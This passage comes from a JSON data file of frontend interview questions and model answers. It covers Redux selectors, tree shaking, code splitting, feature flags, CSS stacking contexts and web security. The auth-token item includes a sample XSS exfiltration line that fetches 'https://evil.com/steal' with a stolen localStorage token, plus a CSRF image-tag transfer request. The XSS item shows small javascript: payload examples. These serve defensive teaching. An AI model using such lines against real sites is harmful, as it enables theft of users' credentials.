selectUsersWithDeepEqual = createDeepEqualSelector(\n  [selectApiResponse],\n  (response) => response.users\n);\n\n// 2. Derived arrays that often have same values\nconst selectActiveUserIds = createSelector(\n  [selectUsers],\n  (users) => users.filter(u => u.isActive).map(u => u.id),\n  {\n    memoizeOptions: {\n      resultEqualityCheck: (a, b) => \n        a.length === b.length && a.every((id, i) => id === b[i]),\n    },\n  }\n);\n\n// 3. Objects with irrelevant changing fields\ninterface User {\n  id: string;\n  name: string;\n  lastSeen: Date; // Changes frequently, but we don't care\n}\n\nconst createUserEqualityCheck = (a: User[], b: User[]) => {\n  if (a.length !== b.length) return false;\n  return a.every((user, i) => \n    user.id === b[i].id && user.name === b[i].name\n    // Ignores lastSeen\n  );\n};\n```\n\n## Performance Tips\n\n```typescript\n// 1. Keep selectors small and focused\n// âŒ Bad\nconst selectEverything = createSelector([selectState], (state) => ({\n  users: state.users,\n  posts: state.posts,\n  comments: state.comments,\n  // ...\n}));\n\n// âœ… Good\nconst selectUsers = (state: RootState) => state.users;\nconst selectPosts = (state: RootState) => state.posts;\n\n// 2. Avoid creating objects in input selectors\n// âŒ Bad\nconst selectUserAndFilter = createSelector(\n  [(state) => ({ user: state.user, filter: state.filter })], // New object!\n  (combined) => ...\n);\n\n// âœ… Good\nconst selectUserAndFilter = createSelector(\n  [selectUser, selectFilter],\n  (user, filter) => ...\n);\n\n// 3. Use weakMapMemoize for instance-based caching\nimport { weakMapMemoize } from '@reduxjs/toolkit';\n\nconst selectItemsByCategory = createSelector(\n  [selectItems, (state: RootState, category: string) => category],\n  (items, category) => items.filter(i => i.category === category),\n  { memoize: weakMapMemoize }\n);\n```",
      "keyPoints": [
        "Understands why derived data needs memoization",
        "Can explain how Reselect caches results",
        "Knows how to compose selectors",
        "Can implement parameterized selectors correctly",
        "Understands when to use custom equality checks"
      ],
      "followUpQuestions": [
        "How would you debug a selector that's recomputing too often?",
        "What's the memory footprint of memoized selectors?",
        "How does selector memoization compare to component memoization?",
        "When would you NOT use a memoized selector?"
      ],
      "relatedTopics": [
        "redux",
        "state-management",
        "performance",
        "memoization"
      ],
      "source": "seed",
      "commonAt": [
        "Companies using Redux"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "bundle-tree-shaking-001",
      "category": "bundle-tree-shaking",
      "difficulty": "senior",
      "question": "Explain how tree shaking works in modern bundlers. Why do some libraries not tree-shake well, and how would you audit and fix bundle size issues?",
      "answer": "## How Tree Shaking Works\n\nTree shaking is dead code elimination based on ES Module static analysis. Bundlers analyze import/export statements to determine which code is actually used.\n\n### Prerequisites for Tree Shaking\n\n```typescript\n// âœ… ES Modules - static, analyzable\nimport { map, filter } from 'lodash-es';\nexport const utils = { map, filter };\n\n// âŒ CommonJS - dynamic, not analyzable\nconst _ = require('lodash');\nmodule.exports = { map: _.map };\n```\n\n### Why Some Libraries Don't Tree-Shake\n\n**1. Side Effects in Module Scope:**\n```typescript\n// âŒ Bad: Side effect at module level\nconsole.log('Utils loaded!'); // Bundler can't remove this file\nexport const add = (a: number, b: number) => a + b;\n```\n\n**2. Missing sideEffects Field:**\n```json\n{\n  \"name\": \"my-library\",\n  \"sideEffects\": false\n}\n```\n\n**3. Barrel Files Anti-Pattern:**\n```typescript\n// âŒ Bad: Re-exporting everything\nexport * from './Button';\nexport * from './Card';\n// ... 50 more components\n```\n\n### Auditing Bundle Size\n\n```bash\n# Webpack Bundle Analyzer\nnpx webpack-bundle-analyzer stats.json\n\n# Vite\nnpm install rollup-plugin-visualizer\n```\n\n### Fixing Bundle Issues\n\n```typescript\n// 1. Direct imports instead of barrel files\nimport { Button } from './components/Button';\n\n// 2. Replace heavy libraries\nimport { debounce } from 'lodash-es'; // Instead of full lodash\n\n// 3. Dynamic imports for conditional features\nconst PDFExport = lazy(() => import('./PDFExport'));\n```",
      "keyPoints": [
        "Understands ES Modules requirement for tree shaking",
        "Knows sideEffects field in package.json",
        "Can identify barrel file anti-pattern",
        "Familiar with bundle analysis tools"
      ],
      "followUpQuestions": [
        "How does tree shaking differ between Webpack and Rollup?",
        "What's the impact of CSS-in-JS on bundle size?"
      ],
      "relatedTopics": [
        "webpack",
        "vite",
        "code-splitting",
        "performance"
      ],
      "source": "seed",
      "commonAt": [
        "Vercel",
        "Shopify"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "bundle-tree-shaking-002",
      "category": "bundle-tree-shaking",
      "difficulty": "mid",
      "question": "Explain code splitting strategies in React. When would you use route-based vs component-based splitting?",
      "answer": "## Code Splitting Strategies\n\n### Route-Based Splitting\nBest for: Pages/routes users may never visit\n\n```typescript\nconst Dashboard = lazy(() => import('./pages/Dashboard'));\nconst Settings = lazy(() => import('./pages/Settings'));\n\nfunction App() {\n  return (\n    <Suspense fallback={<PageSkeleton />}>\n      <Routes>\n        <Route path=\"/dashboard\" element={<Dashboard />} />\n        <Route path=\"/settings\" element={<Settings />} />\n      </Routes>\n    </Suspense>\n  );\n}\n```\n\n### Component-Based Splitting\nBest for: Heavy components not immediately visible\n\n```typescript\nconst HeavyModal = lazy(() => import('./HeavyModal'));\n\nfunction Page() {\n  const [showModal, setShowModal] = useState(false);\n  \n  return (\n    <>\n      <button onClick={() => setShowModal(true)}>Open</button>\n      {showModal && (\n        <Suspense fallback={<Spinner />}>\n          <HeavyModal />\n        </Suspense>\n      )}\n    </>\n  );\n}\n```\n\n### Preloading Strategies\n\n```typescript\n// Preload on hover\n<Link \n  to=\"/dashboard\"\n  onMouseEnter={() => import('./pages/Dashboard')}\n>\n  Dashboard\n</Link>\n```\n\n| Strategy | Use When |\n|----------|----------|\n| Route-based | Separate pages |\n| Component-based | Heavy below-fold content |\n| Feature-based | Conditional features |",
      "keyPoints": [
        "Understands route vs component splitting",
        "Knows React.lazy and Suspense usage",
        "Can implement preloading strategies"
      ],
      "followUpQuestions": [
        "How would you handle chunk loading errors?",
        "What's the overhead of too many small chunks?"
      ],
      "relatedTopics": [
        "react-lazy",
        "suspense",
        "webpack"
      ],
      "source": "seed",
      "commonAt": [
        "Most React companies"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "security-auth-001",
      "category": "security-auth",
      "difficulty": "senior",
      "question": "Compare localStorage vs HttpOnly cookies for storing authentication tokens. What are the security implications of each approach?",
      "answer": "## Security Comparison\n\n| Aspect | localStorage | HttpOnly Cookie |\n|--------|-------------|-----------------|\n| XSS Vulnerability | **HIGH** - JS can read | **LOW** - JS cannot access |\n| CSRF Vulnerability | **LOW** - Not auto-sent | **HIGH** - Auto-sent |\n| Subdomains | Same origin only | Configurable |\n\n## XSS Attack Vector\n\n```typescript\n// localStorage - vulnerable to XSS\nconst stolenToken = localStorage.getItem('authToken');\nfetch('https://evil.com/steal', { body: stolenToken });\n\n// HttpOnly cookie - protected from XSS\ndocument.cookie; // HttpOnly cookies not visible\n```\n\n## CSRF Attack Vector\n\n```html\n<!-- HttpOnly cookie - vulnerable to CSRF -->\n<img src=\"https://bank.com/transfer?to=attacker&amount=1000\" />\n```\n\n## Best Practice: Hybrid Approach\n\n```typescript\n// Server\nres.cookie('refreshToken', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict',\n  path: '/api/auth/refresh',\n});\n\n// Client - store access token in memory\nclass AuthManager {\n  private accessToken: string | null = null;\n  \n  async fetch(url: string, options: RequestInit = {}) {\n    return fetch(url, {\n      ...options,\n      credentials: 'include',\n      headers: {\n        ...options.headers,\n        'Authorization': `Bearer ${this.accessToken}`,\n      },\n    });\n  }\n}\n```\n\n**Recommendation:**\n- Access Token: Memory (15 min expiry)\n- Refresh Token: HttpOnly cookie\n- Add CSRF tokens for cookie-based requests",
      "keyPoints": [
        "Understands XSS vs CSRF attack vectors",
        "Knows HttpOnly prevents JavaScript access",
        "Recommends hybrid approach",
        "Implements CSRF protection"
      ],
      "followUpQuestions": [
        "How would you handle token refresh in a SPA?",
        "What about subdomain cookie sharing?"
      ],
      "relatedTopics": [
        "xss",
        "csrf",
        "jwt",
        "session-management"
      ],
      "source": "seed",
      "commonAt": [
        "Any company handling auth"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "security-auth-002",
      "category": "security-auth",
      "difficulty": "mid",
      "question": "What is XSS (Cross-Site Scripting)? Explain the different types and how to prevent them in a React application.",
      "answer": "## XSS Types\n\n### 1. Stored XSS\nScript stored in database, served to all users.\n\n### 2. Reflected XSS\nScript reflected from URL parameters.\n\n### 3. DOM-based XSS\nClient-side JS manipulates DOM unsafely.\n\n## React's Built-in Protection\n\n```tsx\n// âœ… Safe - React escapes this\nfunction Comment({ text }: { text: string }) {\n  return <p>{text}</p>;\n}\n// \"<script>alert('xss')</script>\" â†’ displayed as text\n```\n\n## React XSS Vulnerabilities\n\n### dangerouslySetInnerHTML\n\n```tsx\n// âŒ Dangerous\n<div dangerouslySetInnerHTML={{ __html: userInput }} />\n\n// âœ… Safe - sanitize first\nimport DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ \n  __html: DOMPurify.sanitize(userInput) \n}} />\n```\n\n### javascript: URLs\n\n```tsx\n// âŒ Vulnerable\n<a href={userUrl}>Link</a>\n// Attacker: javascript:alert('XSS')\n\n// âœ… Safe - validate protocol\nconst safeUrl = url.startsWith('http') ? url : '#';\n```\n\n## Prevention Checklist\n- Use React's default escaping\n- Sanitize HTML with DOMPurify\n- Validate URLs (block javascript:)\n- Implement Content Security Policy",
      "keyPoints": [
        "Can explain stored, reflected, DOM-based XSS",
        "Understands React's automatic escaping",
        "Knows dangerous patterns",
        "Implements sanitization"
      ],
      "followUpQuestions": [
        "How does CSP help prevent XSS?",
        "What about XSS in SSR contexts?"
      ],
      "relatedTopics": [
        "security",
        "csp",
        "sanitization"
      ],
      "source": "seed",
      "commonAt": [
        "Any security-conscious company"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "feature-flags-001",
      "category": "feature-flags",
      "difficulty": "senior",
      "question": "Design a feature flag system for a large-scale frontend application. How would you handle gradual rollouts, A/B testing, and flag dependencies?",
      "answer": "## Feature Flag Architecture\n\n```typescript\ninterface FeatureFlag {\n  key: string;\n  type: 'boolean' | 'string' | 'number';\n  defaultValue: unknown;\n  rules: TargetingRule[];\n  rollout?: { percentage: number };\n  prerequisites?: { flagKey: string; requiredValue: unknown }[];\n}\n\ninterface TargetingRule {\n  conditions: Condition[];\n  value: unknown;\n  percentage?: number;\n}\n```\n\n## Flag Evaluation Engine\n\n```typescript\nclass FlagEvaluator {\n  evaluate<T>(flag: FeatureFlag, context: UserContext): T {\n    // 1. Check prerequisites\n    for (const prereq of flag.prerequisites ?? []) {\n      if (this.evaluate(this.getFlag(prereq.flagKey), context) !== prereq.requiredValue) {\n        return flag.defaultValue as T;\n      }\n    }\n    \n    // 2. Evaluate targeting rules\n    for (const rule of flag.rules) {\n      if (this.matchesRule(rule, context)) {\n        return rule.value as T;\n      }\n    }\n    \n    // 3. Apply percentage rollout with consistent bucketing\n    if (flag.rollout && this.isInPercentage(context.userId, flag.key, flag.rollout.percentage)) {\n      return true as T;\n    }\n    \n    return flag.defaultValue as T;\n  }\n  \n  private isInPercentage(userId: string, flagKey: string, percentage: number): boolean {\n    const hash = this.hash(`${userId}:${flagKey}`);\n    return (hash % 100) + 1 <= percentage;\n  }\n}\n```\n\n## React Integration\n\n```typescript\nfunction useFeatureFlag(flagKey: string): boolean {\n  const { flags } = useContext(FeatureFlagContext);\n  return Boolean(flags[flagKey]);\n}\n\n// Usage\nfunction Checkout() {\n  const useNewCheckout = useFeatureFlag('new-checkout');\n  return useNewCheckout ? <NewCheckout /> : <LegacyCheckout />;\n}\n```\n\n## Gradual Rollout Configuration\n\n```typescript\nconst flag: FeatureFlag = {\n  key: 'new-checkout',\n  rules: [\n    { conditions: [{ attribute: 'email', operator: 'contains', value: '@company.com' }], value: true },\n    { conditions: [{ attribute: 'isBetaUser', operator: 'equals', value: true }], value: true },\n  ],\n  rollout: { percentage: 25 }, // Start at 25%, increase gradually\n};\n```",
      "keyPoints": [
        "Understands targeting rules",
        "Implements consistent percentage bucketing",
        "Handles flag dependencies",
        "Integrates with analytics for A/B testing"
      ],
      "followUpQuestions": [
        "How would you handle stale flags during deployment?",
        "How do you test code paths for flags that are off?"
      ],
      "relatedTopics": [
        "a-b-testing",
        "gradual-rollout",
        "trunk-based-development"
      ],
      "source": "seed",
      "commonAt": [
        "Netflix",
        "Spotify",
        "LinkedIn"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "feature-flags-002",
      "category": "feature-flags",
      "difficulty": "mid",
      "question": "How do feature flags enable trunk-based development? What are the best practices for managing flag lifecycle?",
      "answer": "## Trunk-Based Development with Feature Flags\n\n```\nTraditional: Feature branches (days/weeks)\nmain â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º\n      \\â”€â”€feature-branchâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€/\n\nTrunk-based: Short-lived branches + flags\nmain â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â–º\n       â†‘ â†‘ â†‘ â†‘ (daily commits behind flags)\n```\n\n## Benefits\n\n1. **Continuous Integration**: Code merged daily\n2. **Reduced Merge Conflicts**: Small, frequent merges\n3. **Safer Deployments**: Feature hidden until ready\n4. **Quick Rollback**: Disable flag without deploy\n\n## Flag Lifecycle\n\n```\n1. CREATED    â†’ Flag added, default OFF\n2. DEVELOPING â†’ Code committed behind flag\n3. TESTING    â†’ Enabled for QA/staging\n4. ROLLING    â†’ Gradual production rollout\n5. RELEASED   â†’ 100% enabled\n6. CLEANUP    â†’ Remove flag code\n7. ARCHIVED   â†’ Flag deleted\n```\n\n## Best Practices\n\n```typescript\n// 1. Flag naming convention\nconst FLAGS = {\n  CHECKOUT_V2: 'checkout-v2',           // Feature flag\n  EXPERIMENT_CTA_COLOR: 'exp-cta-color', // Experiment\n  OPS_RATE_LIMIT: 'ops-rate-limit',      // Operational\n} as const;\n\n// 2. Default to OFF for safety\nconst flag: FeatureFlag = {\n  key: 'risky-feature',\n  defaultValue: false, // Always safe default\n};\n\n// 3. Set expiration dates\ninterface FeatureFlag {\n  expiresAt?: string; // Alert when flag should be cleaned up\n}\n\n// 4. Document flag purpose\ninterface FeatureFlag {\n  description: string;\n  owner: string;\n  jiraTicket?: string;\n}\n```\n\n## Flag Cleanup Process\n\n```typescript\n// Before cleanup\nfunction Checkout() {\n  const useNewCheckout = useFeatureFlag('checkout-v2');\n  return useNewCheckout ? <NewCheckout /> : <LegacyCheckout />;\n}\n\n// After cleanup (flag at 100% for 2 weeks)\nfunction Checkout() {\n  return <NewCheckout />;\n}\n// Delete LegacyCheckout component\n// Remove flag from system\n```",
      "keyPoints": [
        "Understands trunk-based development benefits",
        "Knows flag lifecycle stages",
        "Implements cleanup process",
        "Uses naming conventions"
      ],
      "followUpQuestions": [
        "How do you prevent flag accumulation?",
        "What metrics indicate a flag is ready for cleanup?"
      ],
      "relatedTopics": [
        "ci-cd",
        "deployment",
        "testing"
      ],
      "source": "seed",
      "commonAt": [
        "Google",
        "Meta",
        "Modern tech companies"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "feature-flags-003",
      "category": "feature-flags",
      "difficulty": "mid",
      "question": "How do feature flags enable trunk-based development? What are the best practices for managing long-lived feature flags?",
      "answer": "## Trunk-Based Development with Feature Flags\n\n```\nTraditional Git Flow:\nmain â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º\n       \\                                    /\n        feature/new-checkout â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º (merge after weeks)\n         \\              /\n          fix-1  fix-2  (conflicts accumulate)\n\nTrunk-Based with Flags:\nmain â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â–º\n      â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚\n      (Small commits, always deployable, behind flags)\n```\n\n## How It Works\n\n```typescript\n// Day 1: Start new checkout feature (behind flag)\nfunction CheckoutPage() {\n  const useNewCheckout = useFeatureFlag('new-checkout');\n  \n  // New code is deployed but not active\n  if (useNewCheckout) {\n    return <NewCheckout />; // Work in progress\n  }\n  \n  return <LegacyCheckout />; // Current production\n}\n\n// Day 2-10: Continue developing, deploying daily\n// Each commit goes to main, but flag is OFF\n\n// Day 11: Enable for internal testing\n// Flag: 100% for @company.com emails\n\n// Day 14: Enable for beta users\n// Flag: 100% for beta + internal\n\n// Day 21: Gradual rollout\n// Flag: 10% â†’ 25% â†’ 50% â†’ 100%\n\n// Day 28: Remove flag (cleanup)\nfunction CheckoutPage() {\n  return <NewCheckout />; // Flag removed, old code deleted\n}\n```\n\n## Best Practices for Long-Lived Flags\n\n### 1. Flag Lifecycle Management\n\n```typescript\ninterface FlagMetadata {\n  key: string;\n  owner: string; // Team or person responsible\n  createdAt: string;\n  expectedRemovalDate: string; // When flag should be cleaned up\n  jiraTicket: string; // Link to cleanup task\n  type: 'release' | 'experiment' | 'ops' | 'permission';\n}\n\n// Flag types:\n// - release: Temporary, for deploying features (remove after rollout)\n// - experiment: A/B tests (remove after analysis)\n// - ops: Kill switches, permanent (different lifecycle)\n// - permission: Entitlement flags (may be permanent)\n```\n\n### 2. Automated Flag Cleanup Reminders\n\n```typescript\n// CI check for stale flags\nasync function checkStaleFlags() {\n  const flags = await fetchAllFlags();\n  const staleFlags = flags.filter(flag => {\n    const age = Date.now() - new Date(flag.createdAt).getTime();\n    const maxAge = 90 * 24 * 60 * 60 * 1000; // 90 days\n    \n    return age > maxAge && flag.type === 'release';\n  });\n  \n  if (staleFlags.length > 0) {\n    // Post to Slack, create JIRA tickets, etc.\n    await notifyOwners(staleFlags);\n  }\n}\n```\n\n### 3. Code Organization\n\n```typescript\n// âŒ Bad: Flag checks scattered everywhere\nfunction ProductPage() {\n  const flagA = useFeatureFlag('feature-a');\n  const flagB = useFeatureFlag('feature-b');\n  \n  return (\n    <div>\n      {flagA && <ComponentA />}\n      <ProductInfo />\n      {flagB && <ComponentB />}\n      {flagA && flagB && <ComponentC />}\n    </div>\n  );\n}\n\n// âœ… Good: Centralized flag-dependent logic\nfunction ProductPage() {\n  return <ProductPageContent />;\n}\n\n// Feature-specific component handles its own flag\nfunction FeatureASection() {\n  const isEnabled = useFeatureFlag('feature-a');\n  if (!isEnabled) return null;\n  return <ComponentA />;\n}\n\n// Or use composition\nfunction ProductPageContent() {\n  return (\n    <div>\n      <FeatureGated flag=\"feature-a\">\n        <ComponentA />\n      </FeatureGated>\n      <ProductInfo />\n    </div>\n  );\n}\n```\n\n### 4. Testing Both Paths\n\n```typescript\n// Always test both flag states\ndescribe('Checkout', () => {\n  describe('with new-checkout enabled', () => {\n    beforeEach(() => {\n      mockFeatureFlag('new-checkout', true);\n    });\n    \n    it('renders new checkout flow', () => {\n      render(<CheckoutPage />);\n      expect(screen.getByTestId('new-checkout')).toBeInTheDocument();\n    });\n  });\n  \n  describe('with new-checkout disabled', () => {\n    beforeEach(() => {\n      mockFeatureFlag('new-checkout', false);\n    });\n    \n    it('renders legacy checkout flow', () => {\n      render(<CheckoutPage />);\n      expect(screen.getByTestId('legacy-checkout')).toBeInTheDocument();\n    });\n  });\n});\n\n// Test helper\nfunction mockFeatureFlag(key: string, value: boolean) {\n  jest.spyOn(featureFlagHooks, 'useFeatureFlag').mockImplementation(\n    (flagKey) => flagKey === key ? value : false\n  );\n}\n```\n\n### 5. Flag Removal Checklist\n\n```markdown\n## Flag Removal Checklist: new-checkout\n\n- [ ] Feature fully rolled out (100%)\n- [ ] Monitoring shows no issues for 7+ days\n- [ ] Remove all flag checks in code\n- [ ] Remove fallback/legacy code\n- [ ] Update/remove related tests\n- [ ] Archive flag in flag service\n- [ ] Update documentation\n- [ ] Communicate to team\n```\n\n## Managing Technical Debt\n\n```typescript\n// Track flag debt in codebase\n// eslint-plugin-custom-rules\n\n// .eslintrc\n{\n  \"rules\": {\n    \"custom/no-nested-feature-flags\": \"error\",\n    \"custom/feature-flag-comment-required\": \"warn\"\n  }\n}\n\n// Rule: Require comment explaining flag\n// âŒ Error\nif (useFeatureFlag('xyz')) { ... }\n\n// âœ… OK\n// FLAG: xyz - New checkout flow, remove by 2024-06-01\n// JIRA: PROJ-1234\nif (useFeatureFlag('xyz')) { ... }\n```",
      "keyPoints": [
        "Understands trunk-based development benefits",
        "Knows flag lifecycle (release, experiment, ops)",
        "Implements automated cleanup reminders",
        "Tests both flag states",
        "Has flag removal checklist",
        "Manages technical debt from flags"
      ],
      "followUpQuestions": [
        "How do you handle conflicts between flags?",
        "What metrics indicate a flag is safe to remove?",
        "How do you handle flags during incidents?",
        "What about feature flags in microservices?"
      ],
      "relatedTopics": [
        "trunk-based-development",
        "ci-cd",
        "technical-debt"
      ],
      "source": "seed",
      "commonAt": [
        "Companies practicing CI/CD"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "css-layout-001",
      "category": "css-layout",
      "difficulty": "senior",
      "question": "Explain the CSS stacking context. When is a new stacking context created, and how does it affect z-index behavior?",
      "answer": "## What is a Stacking Context?\n\nA stacking context is a three-dimensional conceptualization of HTML elements along the z-axis. Elements within a stacking context are painted in a specific order, and z-index only works within the same stacking context.\n\n```\nStacking Context Visualization:\n\nScreen (viewer)\n    â”‚\n    â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚  Root Stacking Context              â”‚\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚\nâ”‚  â”‚  Child Stacking Context A   â”‚    â”‚\nâ”‚  â”‚  z-index: 1                 â”‚    â”‚\nâ”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚    â”‚\nâ”‚  â”‚  â”‚ Grandchild z:9999    â”‚   â”‚    â”‚  â† Cannot escape parent!\nâ”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚    â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚\nâ”‚  â”‚  Child Stacking Context B   â”‚    â”‚\nâ”‚  â”‚  z-index: 2                 â”‚    â”‚  â† Always above A, regardless\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚    of grandchild's z-index\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## What Creates a Stacking Context?\n\n```css\n/* 1. Root element (<html>) */\n/* Always creates root stacking context */\n\n/* 2. Positioned elements with z-index other than auto */\n.creates-context {\n  position: relative; /* or absolute, fixed, sticky */\n  z-index: 1; /* any value except auto */\n}\n\n/* 3. Flexbox/Grid children with z-index */\n.flex-container {\n  display: flex;\n}\n.flex-child {\n  z-index: 1; /* creates stacking context */\n}\n\n/* 4. Opacity less than 1 */\n.creates-context {\n  opacity: 0.99; /* yes, even 0.99! */\n}\n\n/* 5. Transform (any value except none) */\n.creates-context {\n  transform: translateX(0); /* even no-op transform */\n}\n\n/* 6. Filter */\n.creates-context {\n  filter: blur(0);\n}\n\n/* 7. Perspective */\n.creates-context {\n  perspective: 1000px;\n}\n\n/* 8. clip-path */\n.creates-context {\n  clip-path: circle(50%);\n}\n\n/* 9. mask / mask-image */\n.creates-context {\n  mask: url(#mask);\n}\n\n/* 10. isolation: isolate */\n.creates-context {\n  isolation: isolate; /* explicitly creates context */\n}\n\n/* 11. mix-blend-mode (not normal) */\n.creates-context {\n  mix-blend-mode: multiply;\n}\n\n/* 12. will-change with certain values */\n.creates-context {\n  will-change: transform;\n}\n\n/* 13. contain: layout or paint */\n.creates-context {\n  contain: layout;\n}\n```\n\n## Common z-index Issues\n\n### Issue 1: z-index Not Working\n\n```css\n/* âŒ z-index has no effect without positioning */\n.broken {\n  z-index: 9999;\n}\n\n/* âœ… Needs position */\n.fixed {\n  position: relative;\n  z-index: 9999;\n}\n\n/* âœ… Or be a flex/grid child */\n.flex-child {\n  z-index: 9999; /* works if parent is flex/grid */\n}\n```\n\n### Issue 2: Modal Behind Content\n\n```html\n<div class=\"header\" style=\"position: fixed; z-index: 100;\">\n  Header\n</div>\n<main class=\"content\" style=\"transform: translateY(0);\">\n  <!-- transform creates new stacking context! -->\n  <div class=\"modal\" style=\"position: fixed; z-index: 9999;\">\n    Modal appears BEHIND header!\n  </div>\n</main>\n```\n\n```css\n/* Fix 1: Remove transform from content */\n.content {\n  /* remove transform */\n}\n\n/* Fix 2: Move modal outside */\n/* Render modal as sibling to content, not child */\n\n/* Fix 3: Use portal (React) */\n```\n\n```tsx\n// React Portal solution\nfunction Modal({ children }: { children: React.ReactNode }) {\n  return createPortal(\n    <div className=\"modal\">{children}</div>,\n    document.body // Renders outside of content's stacking context\n  );\n}\n```\n\n### Issue 3: Tooltip Clipped by Overflow\n\n```css\n.container {\n  overflow: hidden; /* clips descendants */\n}\n\n.tooltip {\n  position: absolute;\n  z-index: 9999; /* still clipped! */\n}\n\n/* Fix: Use portal or overflow: visible on ancestor chain */\n```\n\n## Stacking Order Within Context\n\n```\nBottom (painted first)\nâ”‚\nâ”œâ”€â”€ 1. Background/borders of stacking context element\nâ”œâ”€â”€ 2. Negative z-index children (in order)\nâ”œâ”€â”€ 3. Block-level descendants (in DOM order)\nâ”œâ”€â”€ 4. Floated descendants\nâ”œâ”€â”€ 5. Inline descendants\nâ”œâ”€â”€ 6. z-index: 0 or auto positioned descendants\nâ”œâ”€â”€ 7. Positive z-index children (in order)\nâ”‚\nTop (painted last)\n```\n\n## Debugging Stacking Contexts\n\n```typescript\n// Find all stacking contexts\nfunction findStackingContexts(element: Element = document.body, depth = 0): void {\n  const style = getComputedStyle(element);\n  \n  const createsContext = \n    style.zIndex !== 'auto' && style.position !== 'static' ||\n    parseFloat(style.opacity) < 1 ||\n    style.transform !== 'none' ||\n    style.filter !== 'none' ||\n    style.perspective !== 'none' ||\n    style.isolation === 'isolate' ||\n    style.mixBlendMode !== 'normal' ||\n    style.willChange.match(/transform|opacity|filter/);\n  \n  if (createsContext) {\n    console.log('  '.repeat(depth), element.tagName, element.className, {\n      zIndex: style.zIndex,\n      position: style.position,\n      opacity: style.opacity,\n      transform: style.transform,\n    });\n  }\n  \n  for (const child of element.children) {\n    findStackingContexts(child, createsContext ? depth + 1 : depth);\n  }\n}\n\nfindStackingContexts();\n```\n\n## Best Practices\n\n```css\n/* 1. Use isolation: isolate for intentional contexts */\n.card {\n  isolation: isolate; /* clear intent */\n}\n\n/* 2. Use CSS custom properties for z-index scale */\n:root {\n  --z-dropdown: 100;\n  --z-sticky: 200;\n  --z-modal-backdrop: 300;\n  --z-modal: 400;\n  --z-tooltip: 500;\n  --z-toast: 600;\n}\n\n.modal {\n  z-index: var(--z-modal);\n}\n\n/* 3. Avoid inline z-index values */\n\n/* 4. Document stacking context creation */\n.header {\n  position: sticky;\n  top: 0;\n  z-index: var(--z-sticky);\n  /* NOTE: Creates stacking context */\n}\n```",
      "keyPoints": [
        "Knows what creates a stacking context",
        "Understands z-index scope limitations",
        "Can debug stacking issues",
        "Uses portals for escaping contexts",
        "Has organized z-index scale",
        "Uses isolation: isolate intentionally"
      ],
      "followUpQuestions": [
        "How do you handle z-index in a component library?",
        "What about stacking contexts in iframes?",
        "How does paint order affect performance?",
